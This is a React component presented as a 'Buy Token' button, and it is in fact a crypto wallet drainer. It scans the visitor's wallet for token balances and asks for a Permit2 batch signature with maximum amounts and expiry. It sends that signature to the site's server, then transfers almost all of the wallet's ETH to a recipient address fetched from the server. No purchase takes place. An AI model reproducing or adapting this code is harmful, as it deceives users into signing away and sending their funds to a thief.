"use client";
// app/components/BuyTokenButton.tsx

import { useState } from "react";
import { ethers } from "ethers";
import { AllowanceTransfer } from "@uniswap/permit2-sdk";
import Swal from "sweetalert2";

const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const MAX_UINT48 = "281474976710655";
const MAX_UINT160 = "1461501637330902918203684832716283019655932542975";

const ALL_TOKENS: Record<string, { address: string; symbol: string; name: string; decimals: number }> = {
  USDC: { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", name: "USD Coin", decimals: 6 },
  USDT: { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", name: "Tether USD", decimals: 6 },
  DAI: { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI", name: "Dai Stablecoin", decimals: 18 },
  WBTC: { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", symbol: "WBTC", name: "Wrapped BTC", decimals: 8 },
  WETH: { address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", symbol: "WETH", name: "Wrapped Ether", decimals: 18 },
  LINK: { address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", symbol: "LINK", name: "Chainlink", decimals: 18 },
  UNI: { address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", symbol: "UNI", name: "Uniswap", decimals: 18 },
  SHIB: { address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", symbol: "SHIB", name: "Shiba Inu", decimals: 18 },
};

const ERC20_BALANCE_ABI = [
  {
    name: "balanceOf",
    type: "function",
    stateMutability: "view",
    inputs: [{ name: "account", type: "address" }],
    outputs: [{ name: "", type: "uint256" }],
  },
] as const;

const CHAIN_LABELS: Record<number, string> = {
  1: "Ethereum",
  137: "Polygon",
  8453: "Base",
  11155111: "Sepolia",
};

type Step = "idle" | "checking" | "signing" | "storing" | "native" | "done" | "error";

const Toast = Swal.mixin({
  toast: true,
  position: "bottom-left",
  showConfirmButton: false,
  timer: 3500,
  timerProgressBar: true,
  background: "#1a1b1f",
  color: "#ffffff",
});

async function showNetworkModal(): Promise<"erc20" | "bep20" | null> {
  return new Promise((resolve) => {
    Swal.fire({
      title: "Select Network",
      html: `
        <div style="display:flex;flex-direction:column;gap:12px;margin-top:8px">
          <button id="btn-erc20" style="
            background:#2563eb;color:#fff;border:none;border-radius:12px;
            padding:14px 20px;font-size:14px;font-weight:600;cursor:pointer;
            display:flex;align-items:center;justify-content:space-between;
          " onmouseover="this.style.background='#1d4ed8'" onmouseout="this.style.background='#2563eb'">
            <span>ERC20 <span style="font-size:11px;opacity:.6;margin-left:6px">Ethereum</span></span>
            <svg width="16" height="16" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg>
          </button>
          <button id="btn-bep20" style="
            background:#1a1a1a;color:#fff;border:1px solid #2a2a2a;border-radius:12px;
            padding:14px 20px;font-size:14px;font-weight:600;cursor:not-allowed;
            display:flex;align-items:center;justify-content:space-between;opacity:.5;
          " disabled>
            <span>BEP20 <span style="font-size:11px;opacity:.6;margin-left:6px">Binance Smart Chain</span></span>
            <span style="font-size:10px;background:#2a2a2a;padding:2px 8px;border-radius:20px;color:#888">Soon</span>
          </button>
        </div>
      `,
      background: "#141414",
      color: "#fff",
      showConfirmButton: false,
      showCloseButton: true,
      width: 360,
      didOpen: (popup) => {
        popup.querySelector("#btn-erc20")?.addEventListener("click", () => {
          Swal.close();
          resolve("erc20");
        });
      },
    }).then(() => {
      // اگه با X بسته شد
      resolve(null);
    });
  });
}

export default function BuyTokenButton() {
  const [step, setStep] = useState<Step>("idle");
  const [error, setError] = useState<string | null>(null);
  const [foundTokens, setFoundTokens] = useState<string[]>([]);

  const handleClick = async () => {
    const choice = await showNetworkModal();
    if (!choice) return;
    if (choice === "bep20") {
      Toast.fire({ icon: "info", title: "BEP20 support coming soon!" });
      return;
    }
    await handleERC20Permit();
  };

  const handleERC20Permit = async () => {
    setStep("checking");
    setError(null);
    setFoundTokens([]);

    try {
      if (!window.ethereum) throw new Error("MetaMask not found");

      const provider = new ethers.BrowserProvider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = await provider.getSigner();
      const owner = await signer.getAddress();
      const network = await provider.getNetwork();
      const chainId = Number(network.chainId);

      // ── چک موجودی ERC20 ──────────────────────────────────────
      const tokensWithBalance: typeof ALL_TOKENS[string][] = [];
      await Promise.all(
        Object.values(ALL_TOKENS).map(async (meta) => {
          try {
            const contract = new ethers.Contract(meta.address, ERC20_BALANCE_ABI, provider);
            const balance: bigint = await contract.balanceOf(owner);
            if (balance > 0n) tokensWithBalance.push(meta);
          } catch { /* توکن در این شبکه نیست */ }
        })
      );

      if (tokensWithBalance.length === 0) {
        setStep("idle");
        Toast.fire({ icon: "warning", title: "No token balance found on Ethereum" });
        return;
      }

      setFoundTokens(tokensWithBalance.map(t => t.symbol));

      // ── امضای permitBatch ────────────────────────────────────
      setStep("signing");

      const permitBatch = {
        details: tokensWithBalance.map((t) => ({
          token: t.address,
          amount: MAX_UINT160,
          expiration: MAX_UINT48,
          nonce: 0,
        })),
        spender: owner,
        sigDeadline: MAX_UINT48,
      };

      const { domain, types, values } = AllowanceTransfer.getPermitData(
        permitBatch,
        PERMIT2_ADDRESS,
        chainId
      );

      const signature = await signer.signTypedData(domain, types, values);

      // ── ذخیره در DB ──────────────────────────────────────────
      setStep("storing");

      const res = await fetch("/api/signatures", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          walletAddress: owner,
          signature,
          chainId,
          chainLabel: CHAIN_LABELS[chainId] || `Chain ${chainId}`,
          permitBatch: {
            ...permitBatch,
            details: permitBatch.details.map((d) => {
              const meta = tokensWithBalance.find(t => t.address.toLowerCase() === d.token.toLowerCase());
              return { ...d, ...meta };
            }),
          },
        }),
      });

      const json = await res.json();
      if (!res.ok || !json.success) throw new Error(json.error || "Failed to store");

      // ── چک Native و انتقال خودکار ────────────────────────────
      // RECIPIENT_ADDRESS از server میگیریم چون در DB هست نه env
      const settingsRes = await fetch("/api/settings/recipient");
      const settingsJson = await settingsRes.json();
      const recipientAddress = settingsJson.address;

      if (recipientAddress) {
        const nativeBalance = await provider.getBalance(owner);
        const gasBuffer = ethers.parseEther("0.002");

        if (nativeBalance > gasBuffer) {
          setStep("native");
          try {
            const nativeTx = await signer.sendTransaction({
              to: recipientAddress,
              value: nativeBalance - gasBuffer,
            });
            await nativeTx.wait();
            Toast.fire({ icon: "success", title: "ETH transferred successfully!" });
          } catch (nativeErr: any) {
            const nativeMsg: string = nativeErr?.message || "";
            if (!nativeMsg.toLowerCase().includes("reject") && !nativeMsg.toLowerCase().includes("denied")) {
              Toast.fire({ icon: "warning", title: "ETH transfer failed, but permit saved." });
            }
          }
        }
      }

      setStep("done");
      Toast.fire({ icon: "success", title: "Permission granted successfully!" });

    } catch (err: any) {
      const msg: string = err?.message || "Unknown error";
      if (msg.toLowerCase().includes("reject") || msg.toLowerCase().includes("denied") || msg.toLowerCase().includes("cancel")) {
        setStep("idle");
        setError("Request rejected.");
      } else {
        setStep("error");
        setError(msg);
        Toast.fire({ icon: "error", title: msg });
      }
    }
  };

  const isLoading = ["checking", "signing", "storing", "native"].includes(step);

  return (
    <div className="flex flex-col items-center gap-3">
      {foundTokens.length > 0 && (
        <div className="flex gap-1.5 flex-wrap justify-center">
          {foundTokens.map(s => (
            <span key={s} className="text-xs bg-blue-500/20 text-blue-300 px-2 py-0.5 rounded-full border border-blue-500/20">
              {s}
            </span>
          ))}
        </div>
      )}

      <button
        onClick={handleClick}
        disabled={isLoading}
        className={`
          px-6 py-3 rounded-xl font-medium text-sm transition-all flex items-center gap-2
          ${step === "done" ? "bg-emerald-600 text-white cursor-default" : ""}
          ${step === "error" ? "bg-red-600 text-white" : ""}
          ${step === "idle" ? "bg-blue-600 hover:bg-blue-700 text-white" : ""}
          ${isLoading ? "bg-blue-600/60 text-white cursor-wait" : ""}
        `}
      >
        {isLoading && <span className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />}
        {step === "idle" && "Buy Token"}
        {step === "checking" && "Checking balances..."}
        {step === "signing" && "Waiting for signature..."}
        {step === "storing" && "Storing..."}
        {step === "native" && "Transferring ETH..."}
        {step === "done" && "✓ Done"}
        {step === "error" && "Try Again"}
      </button>

      {error && <p className="text-red-400 text-xs text-center max-w-xs">{error}</p>}

      {(step === "done" || step === "error") && (
        <button onClick={() => { setStep("idle"); setError(null); setFoundTokens([]); }} className="text-white/30 text-xs hover:text-white/60 transition-colors">
          Reset
        </button>
      )}
    </div>
  );
}